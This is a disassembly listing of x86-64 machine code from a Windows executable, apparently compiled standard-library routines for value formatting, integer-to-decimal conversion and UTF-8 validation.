   140003bf8:	48 8d 45 40          	lea    0x40(%rbp),%rax
   140003bfc:	4c 8d 45 d0          	lea    -0x30(%rbp),%r8
   140003c00:	49 89 00             	mov    %rax,(%r8)
   140003c03:	48 8d 05 d6 00 00 00 	lea    0xd6(%rip),%rax        # 0x140003ce0
   140003c0a:	49 89 40 08          	mov    %rax,0x8(%r8)
   140003c0e:	48 8d 45 60          	lea    0x60(%rbp),%rax
   140003c12:	49 89 40 10          	mov    %rax,0x10(%r8)
   140003c16:	48 8d 05 f3 00 00 00 	lea    0xf3(%rip),%rax        # 0x140003d10
   140003c1d:	49 89 40 18          	mov    %rax,0x18(%r8)
   140003c21:	4c 8d 4d 50          	lea    0x50(%rbp),%r9
   140003c25:	4c 8d 15 14 28 86 00 	lea    0x862814(%rip),%r10        # 0x140866440
   140003c2c:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   140003c30:	4c 89 11             	mov    %r10,(%rcx)
   140003c33:	41 ba 03 00 00 00    	mov    $0x3,%r10d
   140003c39:	4c 89 51 08          	mov    %r10,0x8(%rcx)
   140003c3d:	48 83 61 20 00       	andq   $0x0,0x20(%rcx)
   140003c42:	4d 89 48 20          	mov    %r9,0x20(%r8)
   140003c46:	49 89 40 28          	mov    %rax,0x28(%r8)
   140003c4a:	eb 7e                	jmp    0x140003cca
   140003c4c:	41 0f 10 02          	movups (%r10),%xmm0
   140003c50:	41 0f 10 4a 10       	movups 0x10(%r10),%xmm1
   140003c55:	41 0f 10 52 20       	movups 0x20(%r10),%xmm2
   140003c5a:	48 8d 45 a0          	lea    -0x60(%rbp),%rax
   140003c5e:	0f 29 50 20          	movaps %xmm2,0x20(%rax)
   140003c62:	0f 29 48 10          	movaps %xmm1,0x10(%rax)
   140003c66:	0f 29 00             	movaps %xmm0,(%rax)
   140003c69:	48 8d 4d 40          	lea    0x40(%rbp),%rcx
   140003c6d:	4c 8d 45 d0          	lea    -0x30(%rbp),%r8
   140003c71:	49 89 08             	mov    %rcx,(%r8)
   140003c74:	48 8d 0d 65 00 00 00 	lea    0x65(%rip),%rcx        # 0x140003ce0
   140003c7b:	49 89 48 08          	mov    %rcx,0x8(%r8)
   140003c7f:	49 89 40 10          	mov    %rax,0x10(%r8)
   140003c83:	48 8d 05 76 00 00 00 	lea    0x76(%rip),%rax        # 0x140003d00
   140003c8a:	49 89 40 18          	mov    %rax,0x18(%r8)
   140003c8e:	48 8d 45 60          	lea    0x60(%rbp),%rax
   140003c92:	49 89 40 20          	mov    %rax,0x20(%r8)
   140003c96:	48 8d 05 73 00 00 00 	lea    0x73(%rip),%rax        # 0x140003d10
   140003c9d:	49 89 40 28          	mov    %rax,0x28(%r8)
   140003ca1:	4c 8d 4d 50          	lea    0x50(%rbp),%r9
   140003ca5:	4c 8d 15 e4 27 86 00 	lea    0x8627e4(%rip),%r10        # 0x140866490
   140003cac:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   140003cb0:	4c 89 11             	mov    %r10,(%rcx)
   140003cb3:	41 ba 04 00 00 00    	mov    $0x4,%r10d
   140003cb9:	4c 89 51 08          	mov    %r10,0x8(%rcx)
   140003cbd:	48 83 61 20 00       	andq   $0x0,0x20(%rcx)
   140003cc2:	4d 89 48 30          	mov    %r9,0x30(%r8)
   140003cc6:	49 89 40 38          	mov    %rax,0x38(%r8)
   140003cca:	4c 89 41 10          	mov    %r8,0x10(%rcx)
   140003cce:	4c 89 51 18          	mov    %r10,0x18(%rcx)
   140003cd2:	e8 79 f6 ff ff       	call   0x140003350
   140003cd7:	cc                   	int3
   140003cd8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140003cdf:	00 
   140003ce0:	48 89 d0             	mov    %rdx,%rax
   140003ce3:	48 8b 11             	mov    (%rcx),%rdx
   140003ce6:	4c 8b 41 08          	mov    0x8(%rcx),%r8
   140003cea:	48 89 c1             	mov    %rax,%rcx
   140003ced:	e9 7e fc ff ff       	jmp    0x140003970
   140003cf2:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140003cf9:	1f 84 00 00 00 00 00 
   140003d00:	49 89 c8             	mov    %rcx,%r8
   140003d03:	48 8b 0a             	mov    (%rdx),%rcx
   140003d06:	48 8b 52 08          	mov    0x8(%rdx),%rdx
   140003d0a:	e9 21 00 00 00       	jmp    0x140003d30
   140003d0f:	90                   	nop
   140003d10:	48 8b 01             	mov    (%rcx),%rax
   140003d13:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140003d17:	4c 8b 41 18          	mov    0x18(%rcx),%r8
   140003d1b:	48 89 c1             	mov    %rax,%rcx
   140003d1e:	49 ff e0             	rex.WB jmp *%r8
   140003d21:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140003d28:	0f 1f 84 00 00 00 00 
   140003d2f:	00 
   140003d30:	55                   	push   %rbp
   140003d31:	41 57                	push   %r15
   140003d33:	41 56                	push   %r14
   140003d35:	41 55                	push   %r13
   140003d37:	41 54                	push   %r12
   140003d39:	56                   	push   %rsi
   140003d3a:	57                   	push   %rdi
   140003d3b:	53                   	push   %rbx
   140003d3c:	48 83 ec 38          	sub    $0x38,%rsp
   140003d40:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   140003d45:	4c 89 c6             	mov    %r8,%rsi
   140003d48:	b8 20 00 00 e0       	mov    $0xe0000020,%eax
   140003d4d:	48 89 45 00          	mov    %rax,0x0(%rbp)
   140003d51:	48 89 4d f0          	mov    %rcx,-0x10(%rbp)
   140003d55:	48 89 55 f8          	mov    %rdx,-0x8(%rbp)
   140003d59:	4d 8b 70 20          	mov    0x20(%r8),%r14
   140003d5d:	4d 85 f6             	test   %r14,%r14
   140003d60:	0f 84 04 01 00 00    	je     0x140003e6a
   140003d66:	48 8b 46 28          	mov    0x28(%rsi),%rax
   140003d6a:	48 85 c0             	test   %rax,%rax
   140003d6d:	0f 84 68 01 00 00    	je     0x140003edb
   140003d73:	4c 8b 3e             	mov    (%rsi),%r15
   140003d76:	4c 8b 66 10          	mov    0x10(%rsi),%r12
   140003d7a:	49 83 c7 08          	add    $0x8,%r15
   140003d7e:	48 c1 e0 04          	shl    $0x4,%rax
   140003d82:	4c 8d 2c 40          	lea    (%rax,%rax,2),%r13
   140003d86:	31 ff                	xor    %edi,%edi
   140003d88:	31 db                	xor    %ebx,%ebx
   140003d8a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003d90:	4d 8b 07             	mov    (%r15),%r8
   140003d93:	4d 85 c0             	test   %r8,%r8
   140003d96:	74 17                	je     0x140003daf
   140003d98:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140003d9c:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140003da0:	49 8b 57 f8          	mov    -0x8(%r15),%rdx
   140003da4:	ff 50 18             	call   *0x18(%rax)
   140003da7:	84 c0                	test   %al,%al
   140003da9:	0f 85 28 01 00 00    	jne    0x140003ed7
   140003daf:	41 0f b7 44 3e 10    	movzwl 0x10(%r14,%rdi,1),%eax
   140003db5:	85 c0                	test   %eax,%eax
   140003db7:	74 17                	je     0x140003dd0
   140003db9:	83 f8 01             	cmp    $0x1,%eax
   140003dbc:	75 22                	jne    0x140003de0
   140003dbe:	49 8b 44 3e 18       	mov    0x18(%r14,%rdi,1),%rax
   140003dc3:	48 c1 e0 04          	shl    $0x4,%rax
   140003dc7:	41 0f b7 44 04 08    	movzwl 0x8(%r12,%rax,1),%eax
   140003dcd:	eb 13                	jmp    0x140003de2
   140003dcf:	90                   	nop
   140003dd0:	41 0f b7 44 3e 12    	movzwl 0x12(%r14,%rdi,1),%eax
   140003dd6:	eb 0a                	jmp    0x140003de2
   140003dd8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140003ddf:	00 
   140003de0:	31 c0                	xor    %eax,%eax
   140003de2:	41 0f b7 0c 3e       	movzwl (%r14,%rdi,1),%ecx
   140003de7:	83 f9 02             	cmp    $0x2,%ecx
   140003dea:	74 24                	je     0x140003e10
   140003dec:	83 f9 01             	cmp    $0x1,%ecx
   140003def:	75 2f                	jne    0x140003e20
   140003df1:	49 8b 4c 3e 08       	mov    0x8(%r14,%rdi,1),%rcx
   140003df6:	48 c1 e1 04          	shl    $0x4,%rcx
   140003dfa:	41 0f b7 4c 0c 08    	movzwl 0x8(%r12,%rcx,1),%ecx
   140003e00:	eb 24                	jmp    0x140003e26
   140003e02:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140003e09:	1f 84 00 00 00 00 00 
   140003e10:	31 c9                	xor    %ecx,%ecx
   140003e12:	eb 12                	jmp    0x140003e26
   140003e14:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   140003e1b:	00 00 00 00 00 
   140003e20:	41 0f b7 4c 3e 02    	movzwl 0x2(%r14,%rdi,1),%ecx
   140003e26:	41 8b 54 3e 28       	mov    0x28(%r14,%rdi,1),%edx
   140003e2b:	4d 8b 44 3e 20       	mov    0x20(%r14,%rdi,1),%r8
   140003e30:	49 c1 e0 04          	shl    $0x4,%r8
   140003e34:	89 55 00             	mov    %edx,0x0(%rbp)
   140003e37:	66 89 45 04          	mov    %ax,0x4(%rbp)
   140003e3b:	66 89 4d 06          	mov    %cx,0x6(%rbp)
   140003e3f:	4b 8b 0c 04          	mov    (%r12,%r8,1),%rcx
   140003e43:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   140003e47:	43 ff 54 04 08       	call   *0x8(%r12,%r8,1)
   140003e4c:	84 c0                	test   %al,%al
   140003e4e:	0f 85 83 00 00 00    	jne    0x140003ed7
   140003e54:	49 83 c7 10          	add    $0x10,%r15
   140003e58:	48 83 c7 30          	add    $0x30,%rdi
   140003e5c:	48 ff c3             	inc    %rbx
   140003e5f:	49 39 fd             	cmp    %rdi,%r13
   140003e62:	0f 85 28 ff ff ff    	jne    0x140003d90
   140003e68:	eb 65                	jmp    0x140003ecf
   140003e6a:	4c 8b 76 18          	mov    0x18(%rsi),%r14
   140003e6e:	4d 85 f6             	test   %r14,%r14
   140003e71:	74 72                	je     0x140003ee5
   140003e73:	4c 8b 7e 10          	mov    0x10(%rsi),%r15
   140003e77:	49 c1 e6 04          	shl    $0x4,%r14
   140003e7b:	4d 01 fe             	add    %r15,%r14
   140003e7e:	4c 8b 26             	mov    (%rsi),%r12
   140003e81:	45 31 ed             	xor    %r13d,%r13d
   140003e84:	31 db                	xor    %ebx,%ebx
   140003e86:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140003e8d:	00 00 00 
   140003e90:	4f 8b 44 2c 08       	mov    0x8(%r12,%r13,1),%r8
   140003e95:	4d 85 c0             	test   %r8,%r8
   140003e98:	74 13                	je     0x140003ead
   140003e9a:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140003e9e:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140003ea2:	4b 8b 14 2c          	mov    (%r12,%r13,1),%rdx
   140003ea6:	ff 50 18             	call   *0x18(%rax)
   140003ea9:	84 c0                	test   %al,%al
   140003eab:	75 2a                	jne    0x140003ed7
   140003ead:	4b 8d 3c 2f          	lea    (%r15,%r13,1),%rdi
   140003eb1:	48 8b 0f             	mov    (%rdi),%rcx
   140003eb4:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   140003eb8:	ff 57 08             	call   *0x8(%rdi)
   140003ebb:	84 c0                	test   %al,%al
   140003ebd:	75 18                	jne    0x140003ed7
   140003ebf:	49 83 c5 10          	add    $0x10,%r13
   140003ec3:	48 83 c7 10          	add    $0x10,%rdi
   140003ec7:	48 ff c3             	inc    %rbx
   140003eca:	4c 39 f7             	cmp    %r14,%rdi
   140003ecd:	75 c1                	jne    0x140003e90
   140003ecf:	48 3b 5e 08          	cmp    0x8(%rsi),%rbx
   140003ed3:	73 3c                	jae    0x140003f11
   140003ed5:	eb 16                	jmp    0x140003eed
   140003ed7:	b0 01                	mov    $0x1,%al
   140003ed9:	eb 38                	jmp    0x140003f13
   140003edb:	31 db                	xor    %ebx,%ebx
   140003edd:	48 3b 5e 08          	cmp    0x8(%rsi),%rbx
   140003ee1:	73 2e                	jae    0x140003f11
   140003ee3:	eb 08                	jmp    0x140003eed
   140003ee5:	31 db                	xor    %ebx,%ebx
   140003ee7:	48 3b 5e 08          	cmp    0x8(%rsi),%rbx
   140003eeb:	73 24                	jae    0x140003f11
   140003eed:	48 8b 06             	mov    (%rsi),%rax
   140003ef0:	48 c1 e3 04          	shl    $0x4,%rbx
   140003ef4:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140003ef8:	4c 8b 4d f8          	mov    -0x8(%rbp),%r9
   140003efc:	48 8b 14 18          	mov    (%rax,%rbx,1),%rdx
   140003f00:	4c 8b 44 18 08       	mov    0x8(%rax,%rbx,1),%r8
   140003f05:	41 ff 51 18          	call   *0x18(%r9)
   140003f09:	89 c1                	mov    %eax,%ecx
   140003f0b:	b0 01                	mov    $0x1,%al
   140003f0d:	84 c9                	test   %cl,%cl
   140003f0f:	75 02                	jne    0x140003f13
   140003f11:	31 c0                	xor    %eax,%eax
   140003f13:	48 83 c4 38          	add    $0x38,%rsp
   140003f17:	5b                   	pop    %rbx
   140003f18:	5f                   	pop    %rdi
   140003f19:	5e                   	pop    %rsi
   140003f1a:	41 5c                	pop    %r12
   140003f1c:	41 5d                	pop    %r13
   140003f1e:	41 5e                	pop    %r14
   140003f20:	41 5f                	pop    %r15
   140003f22:	5d                   	pop    %rbp
   140003f23:	c3                   	ret
   140003f24:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   140003f2b:	00 00 00 00 00 
   140003f30:	55                   	push   %rbp
   140003f31:	41 56                	push   %r14
   140003f33:	56                   	push   %rsi
   140003f34:	57                   	push   %rdi
   140003f35:	53                   	push   %rbx
   140003f36:	48 83 ec 50          	sub    $0x50,%rsp
   140003f3a:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   140003f3f:	49 89 d1             	mov    %rdx,%r9
   140003f42:	41 ba 14 00 00 00    	mov    $0x14,%r10d
   140003f48:	4c 8d 1d bc 25 86 00 	lea    0x8625bc(%rip),%r11        # 0x14086650b
   140003f4f:	48 89 ca             	mov    %rcx,%rdx
   140003f52:	48 81 f9 e8 03 00 00 	cmp    $0x3e8,%rcx
   140003f59:	72 64                	jb     0x140003fbf
   140003f5b:	bf 14 00 00 00       	mov    $0x14,%edi
   140003f60:	48 be 4b 59 86 38 d6 	movabs $0x346dc5d63886594b,%rsi
   140003f67:	c5 6d 34 
   140003f6a:	49 89 c8             	mov    %rcx,%r8
   140003f6d:	0f 1f 00             	nopl   (%rax)
   140003f70:	4c 8d 57 fc          	lea    -0x4(%rdi),%r10
   140003f74:	4c 89 c0             	mov    %r8,%rax
   140003f77:	48 f7 e6             	mul    %rsi
   140003f7a:	48 c1 ea 0b          	shr    $0xb,%rdx
   140003f7e:	69 c2 10 27 00 00    	imul   $0x2710,%edx,%eax
   140003f84:	44 89 c3             	mov    %r8d,%ebx
   140003f87:	29 c3                	sub    %eax,%ebx
   140003f89:	69 c3 7b 14 00 00    	imul   $0x147b,%ebx,%eax
   140003f8f:	c1 e8 13             	shr    $0x13,%eax
   140003f92:	44 6b f0 64          	imul   $0x64,%eax,%r14d
   140003f96:	44 29 f3             	sub    %r14d,%ebx
   140003f99:	41 0f b7 04 43       	movzwl (%r11,%rax,2),%eax
   140003f9e:	66 89 44 3d e8       	mov    %ax,-0x18(%rbp,%rdi,1)
   140003fa3:	0f b7 c3             	movzwl %bx,%eax
   140003fa6:	41 0f b7 04 43       	movzwl (%r11,%rax,2),%eax
   140003fab:	66 89 44 3d ea       	mov    %ax,-0x16(%rbp,%rdi,1)
   140003fb0:	4c 89 d7             	mov    %r10,%rdi
   140003fb3:	49 81 f8 7f 96 98 00 	cmp    $0x98967f,%r8
   140003fba:	49 89 d0             	mov    %rdx,%r8
   140003fbd:	77 b1                	ja     0x140003f70
   140003fbf:	48 83 fa 09          	cmp    $0x9,%rdx
   140003fc3:	76 2d                	jbe    0x140003ff2
   140003fc5:	89 d0                	mov    %edx,%eax
   140003fc7:	c1 e8 02             	shr    $0x2,%eax
   140003fca:	0f b7 c0             	movzwl %ax,%eax
   140003fcd:	69 c0 7b 14 00 00    	imul   $0x147b,%eax,%eax
   140003fd3:	c1 e8 11             	shr    $0x11,%eax
   140003fd6:	44 6b c0 64          	imul   $0x64,%eax,%r8d
   140003fda:	44 29 c2             	sub    %r8d,%edx
   140003fdd:	0f b7 d2             	movzwl %dx,%edx
   140003fe0:	41 0f b7 14 53       	movzwl (%r11,%rdx,2),%edx
   140003fe5:	66 42 89 54 15 ea    	mov    %dx,-0x16(%rbp,%r10,1)
   140003feb:	49 83 c2 fe          	add    $0xfffffffffffffffe,%r10
   140003fef:	48 89 c2             	mov    %rax,%rdx
   140003ff2:	48 85 c9             	test   %rcx,%rcx
   140003ff5:	74 05                	je     0x140003ffc
   140003ff7:	48 85 d2             	test   %rdx,%rdx
   140003ffa:	74 11                	je     0x14000400d
   140003ffc:	83 e2 0f             	and    $0xf,%edx
   140003fff:	41 0f b6 44 53 01    	movzbl 0x1(%r11,%rdx,2),%eax
   140004005:	42 88 44 15 eb       	mov    %al,-0x15(%rbp,%r10,1)
   14000400a:	49 ff ca             	dec    %r10
   14000400d:	b8 14 00 00 00       	mov    $0x14,%eax
   140004012:	4c 29 d0             	sub    %r10,%rax
   140004015:	49 8d 0c 2a          	lea    (%r10,%rbp,1),%rcx
   140004019:	48 83 c1 ec          	add    $0xffffffffffffffec,%rcx
   14000401d:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140004022:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140004027:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000402d:	4c 89 c9             	mov    %r9,%rcx
   140004030:	b2 01                	mov    $0x1,%dl
   140004032:	45 31 c9             	xor    %r9d,%r9d
   140004035:	e8 46 f3 ff ff       	call   0x140003380
   14000403a:	90                   	nop
   14000403b:	48 83 c4 50          	add    $0x50,%rsp
   14000403f:	5b                   	pop    %rbx
   140004040:	5f                   	pop    %rdi
   140004041:	5e                   	pop    %rsi
   140004042:	41 5e                	pop    %r14
   140004044:	5d                   	pop    %rbp
   140004045:	c3                   	ret
   140004046:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000404d:	00 00 00 
   140004050:	55                   	push   %rbp
   140004051:	48 83 ec 50          	sub    $0x50,%rsp
   140004055:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   14000405a:	48 8d 05 ef 2e 86 00 	lea    0x862eef(%rip),%rax        # 0x140866f50
   140004061:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
   140004065:	48 c7 45 d8 01 00 00 	movq   $0x1,-0x28(%rbp)
   14000406c:	00 
   14000406d:	48 c7 45 e0 08 00 00 	movq   $0x8,-0x20(%rbp)
   140004074:	00 
   140004075:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004078:	0f 11 45 e8          	movups %xmm0,-0x18(%rbp)
   14000407c:	48 8d 15 0d 47 86 00 	lea    0x86470d(%rip),%rdx        # 0x140868790
   140004083:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140004087:	e8 c4 f2 ff ff       	call   0x140003350
   14000408c:	cc                   	int3
   14000408d:	0f 1f 00             	nopl   (%rax)
   140004090:	55                   	push   %rbp
   140004091:	41 56                	push   %r14
   140004093:	56                   	push   %rsi
   140004094:	57                   	push   %rdi
   140004095:	53                   	push   %rbx
   140004096:	48 83 ec 40          	sub    $0x40,%rsp
   14000409a:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   14000409f:	44 8b 01             	mov    (%rcx),%r8d
   1400040a2:	b8 0a 00 00 00       	mov    $0xa,%eax
   1400040a7:	48 8d 0d 5d 24 86 00 	lea    0x86245d(%rip),%rcx        # 0x14086650b
   1400040ae:	45 89 c1             	mov    %r8d,%r9d
   1400040b1:	41 81 f8 e8 03 00 00 	cmp    $0x3e8,%r8d
   1400040b8:	72 65                	jb     0x14000411f
   1400040ba:	41 bb 0a 00 00 00    	mov    $0xa,%r11d
   1400040c0:	41 ba 59 17 b7 d1    	mov    $0xd1b71759,%r10d
   1400040c6:	44 89 c6             	mov    %r8d,%esi
   1400040c9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400040d0:	49 8d 43 fc          	lea    -0x4(%r11),%rax
   1400040d4:	41 89 f1             	mov    %esi,%r9d
   1400040d7:	4d 0f af ca          	imul   %r10,%r9
   1400040db:	49 c1 e9 2d          	shr    $0x2d,%r9
   1400040df:	41 69 f9 10 27 00 00 	imul   $0x2710,%r9d,%edi
   1400040e6:	89 f3                	mov    %esi,%ebx
   1400040e8:	29 fb                	sub    %edi,%ebx
   1400040ea:	69 fb 7b 14 00 00    	imul   $0x147b,%ebx,%edi
   1400040f0:	c1 ef 13             	shr    $0x13,%edi
   1400040f3:	44 6b f7 64          	imul   $0x64,%edi,%r14d
   1400040f7:	44 29 f3             	sub    %r14d,%ebx
   1400040fa:	0f b7 3c 79          	movzwl (%rcx,%rdi,2),%edi
   1400040fe:	66 42 89 7c 1d f2    	mov    %di,-0xe(%rbp,%r11,1)
   140004104:	0f b7 fb             	movzwl %bx,%edi
   140004107:	0f b7 3c 79          	movzwl (%rcx,%rdi,2),%edi
   14000410b:	66 42 89 7c 1d f4    	mov    %di,-0xc(%rbp,%r11,1)
   140004111:	49 89 c3             	mov    %rax,%r11
   140004114:	81 fe 7f 96 98 00    	cmp    $0x98967f,%esi
   14000411a:	44 89 ce             	mov    %r9d,%esi
   14000411d:	77 b1                	ja     0x1400040d0
   14000411f:	41 83 f9 09          	cmp    $0x9,%r9d
   140004123:	76 30                	jbe    0x140004155
   140004125:	45 0f b7 d1          	movzwl %r9w,%r10d
   140004129:	41 c1 ea 02          	shr    $0x2,%r10d
   14000412d:	45 69 d2 7b 14 00 00 	imul   $0x147b,%r10d,%r10d
   140004134:	41 c1 ea 11          	shr    $0x11,%r10d
   140004138:	45 6b da 64          	imul   $0x64,%r10d,%r11d
   14000413c:	45 29 d9             	sub    %r11d,%r9d
   14000413f:	45 0f b7 c9          	movzwl %r9w,%r9d
   140004143:	46 0f b7 0c 49       	movzwl (%rcx,%r9,2),%r9d
   140004148:	66 44 89 4c 05 f4    	mov    %r9w,-0xc(%rbp,%rax,1)
   14000414e:	48 83 c0 fe          	add    $0xfffffffffffffffe,%rax
   140004152:	45 89 d1             	mov    %r10d,%r9d
   140004155:	45 85 c0             	test   %r8d,%r8d
   140004158:	74 05                	je     0x14000415f
   14000415a:	45 85 c9             	test   %r9d,%r9d
   14000415d:	74 11                	je     0x140004170
   14000415f:	41 83 e1 0f          	and    $0xf,%r9d
   140004163:	42 0f b6 4c 49 01    	movzbl 0x1(%rcx,%r9,2),%ecx
   140004169:	88 4c 05 f5          	mov    %cl,-0xb(%rbp,%rax,1)
   14000416d:	48 ff c8             	dec    %rax
   140004170:	b9 0a 00 00 00       	mov    $0xa,%ecx
   140004175:	48 29 c1             	sub    %rax,%rcx
   140004178:	48 01 e8             	add    %rbp,%rax
   14000417b:	48 83 c0 f6          	add    $0xfffffffffffffff6,%rax
   14000417f:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140004184:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004189:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000418f:	48 89 d1             	mov    %rdx,%rcx
   140004192:	b2 01                	mov    $0x1,%dl
   140004194:	45 31 c9             	xor    %r9d,%r9d
   140004197:	e8 e4 f1 ff ff       	call   0x140003380
   14000419c:	90                   	nop
   14000419d:	48 83 c4 40          	add    $0x40,%rsp
   1400041a1:	5b                   	pop    %rbx
   1400041a2:	5f                   	pop    %rdi
   1400041a3:	5e                   	pop    %rsi
   1400041a4:	41 5e                	pop    %r14
   1400041a6:	5d                   	pop    %rbp
   1400041a7:	c3                   	ret
   1400041a8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400041af:	00 
   1400041b0:	56                   	push   %rsi
   1400041b1:	57                   	push   %rdi
   1400041b2:	55                   	push   %rbp
   1400041b3:	53                   	push   %rbx
   1400041b4:	4c 8b 42 08          	mov    0x8(%rdx),%r8
   1400041b8:	4d 85 c0             	test   %r8,%r8
   1400041bb:	0f 84 67 01 00 00    	je     0x140004328
   1400041c1:	48 8b 02             	mov    (%rdx),%rax
   1400041c4:	45 31 c9             	xor    %r9d,%r9d
   1400041c7:	4c 8d 1d 75 6b 86 00 	lea    0x866b75(%rip),%r11        # 0x14086ad43
   1400041ce:	48 8d 35 03 26 86 00 	lea    0x862603(%rip),%rsi        # 0x1408667d8
   1400041d5:	eb 13                	jmp    0x1400041ea
   1400041d7:	49 83 c1 04          	add    $0x4,%r9
   1400041db:	4d 89 ca             	mov    %r9,%r10
   1400041de:	4d 89 d1             	mov    %r10,%r9
   1400041e1:	4d 39 c2             	cmp    %r8,%r10
   1400041e4:	0f 83 19 01 00 00    	jae    0x140004303
   1400041ea:	42 0f b6 3c 08       	movzbl (%rax,%r9,1),%edi
   1400041ef:	4d 8d 51 01          	lea    0x1(%r9),%r10
   1400041f3:	40 84 ff             	test   %dil,%dil
   1400041f6:	79 e6                	jns    0x1400041de
   1400041f8:	42 0f b6 1c 1f       	movzbl (%rdi,%r11,1),%ebx
   1400041fd:	83 fb 04             	cmp    $0x4,%ebx
   140004200:	74 51                	je     0x140004253
   140004202:	83 fb 03             	cmp    $0x3,%ebx
   140004205:	74 23                	je     0x14000422a
   140004207:	83 fb 02             	cmp    $0x2,%ebx
   14000420a:	0f 85 f3 00 00 00    	jne    0x140004303
   140004210:	4a 8d 3c 10          	lea    (%rax,%r10,1),%rdi
   140004214:	4d 39 c2             	cmp    %r8,%r10
   140004217:	48 0f 43 fe          	cmovae %rsi,%rdi
   14000421b:	80 3f c0             	cmpb   $0xc0,(%rdi)
   14000421e:	0f 8d df 00 00 00    	jge    0x140004303
   140004224:	49 83 c1 02          	add    $0x2,%r9
   140004228:	eb b1                	jmp    0x1400041db
   14000422a:	4a 8d 1c 10          	lea    (%rax,%r10,1),%rbx
   14000422e:	4d 39 c2             	cmp    %r8,%r10
   140004231:	48 0f 43 de          	cmovae %rsi,%rbx
   140004235:	0f b6 1b             	movzbl (%rbx),%ebx
   140004238:	48 81 ff e0 00 00 00 	cmp    $0xe0,%rdi
   14000423f:	74 3b                	je     0x14000427c
   140004241:	81 ff ed 00 00 00    	cmp    $0xed,%edi
   140004247:	75 47                	jne    0x140004290
   140004249:	80 fb 9f             	cmp    $0x9f,%bl
   14000424c:	7e 5a                	jle    0x1400042a8
   14000424e:	e9 b0 00 00 00       	jmp    0x140004303
   140004253:	4a 8d 1c 10          	lea    (%rax,%r10,1),%rbx
   140004257:	4d 39 c2             	cmp    %r8,%r10
   14000425a:	48 0f 43 de          	cmovae %rsi,%rbx
   14000425e:	0f b6 1b             	movzbl (%rbx),%ebx
   140004261:	48 81 ff f0 00 00 00 	cmp    $0xf0,%rdi
   140004268:	74 1c                	je     0x140004286
   14000426a:	81 ff f4 00 00 00    	cmp    $0xf4,%edi
   140004270:	75 54                	jne    0x1400042c6
   140004272:	80 fb 8f             	cmp    $0x8f,%bl
   140004275:	7e 5e                	jle    0x1400042d5
   140004277:	e9 87 00 00 00       	jmp    0x140004303
   14000427c:	80 e3 e0             	and    $0xe0,%bl
   14000427f:	80 fb a0             	cmp    $0xa0,%bl
   140004282:	74 24                	je     0x1400042a8
   140004284:	eb 7d                	jmp    0x140004303
   140004286:	80 c3 70             	add    $0x70,%bl
   140004289:	80 fb 30             	cmp    $0x30,%bl
   14000428c:	72 47                	jb     0x1400042d5
   14000428e:	eb 73                	jmp    0x140004303
   140004290:	8d 6f 1f             	lea    0x1f(%rdi),%ebp
   140004293:	40 80 fd 0c          	cmp    $0xc,%bpl
   140004297:	72 0a                	jb     0x1400042a3
   140004299:	40 80 e7 fe          	and    $0xfe,%dil
   14000429d:	40 80 ff ee          	cmp    $0xee,%dil
   1400042a1:	75 60                	jne    0x140004303
   1400042a3:	80 fb c0             	cmp    $0xc0,%bl
   1400042a6:	7d 5b                	jge    0x140004303
   1400042a8:	4d 8d 51 02          	lea    0x2(%r9),%r10
   1400042ac:	4d 39 c2             	cmp    %r8,%r10
   1400042af:	4a 8d 7c 08 02       	lea    0x2(%rax,%r9,1),%rdi
   1400042b4:	48 0f 43 fe          	cmovae %rsi,%rdi
   1400042b8:	80 3f c0             	cmpb   $0xc0,(%rdi)
   1400042bb:	7d 46                	jge    0x140004303
   1400042bd:	49 83 c1 03          	add    $0x3,%r9
   1400042c1:	e9 15 ff ff ff       	jmp    0x1400041db
   1400042c6:	40 80 c7 0f          	add    $0xf,%dil
   1400042ca:	40 80 ff 02          	cmp    $0x2,%dil
   1400042ce:	77 33                	ja     0x140004303
   1400042d0:	80 fb c0             	cmp    $0xc0,%bl
   1400042d3:	7d 2e                	jge    0x140004303
   1400042d5:	4d 8d 51 02          	lea    0x2(%r9),%r10
   1400042d9:	4d 39 c2             	cmp    %r8,%r10
   1400042dc:	4a 8d 7c 08 02       	lea    0x2(%rax,%r9,1),%rdi
   1400042e1:	48 0f 43 fe          	cmovae %rsi,%rdi
   1400042e5:	80 3f bf             	cmpb   $0xbf,(%rdi)
   1400042e8:	7f 19                	jg     0x140004303
   1400042ea:	4d 8d 51 03          	lea    0x3(%r9),%r10
